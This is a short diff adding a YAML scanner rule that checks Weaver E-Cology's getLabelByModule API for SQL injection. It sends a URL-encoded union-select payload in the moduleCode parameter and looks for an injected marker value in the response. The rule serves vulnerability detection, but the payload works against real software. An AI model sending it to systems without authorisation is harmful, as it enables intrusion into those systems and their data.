@@ -1,0 +1,12 @@
+name: 泛微E-Cology-getLabelByModule-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /api/ec/dev/locale/getLabelByModule?moduleCode=aaa%27)+union+all+select+%271,12123%27+--
+    expression:
+      status: 200
+      body_all:
+        - "\"type\":\"12123\""
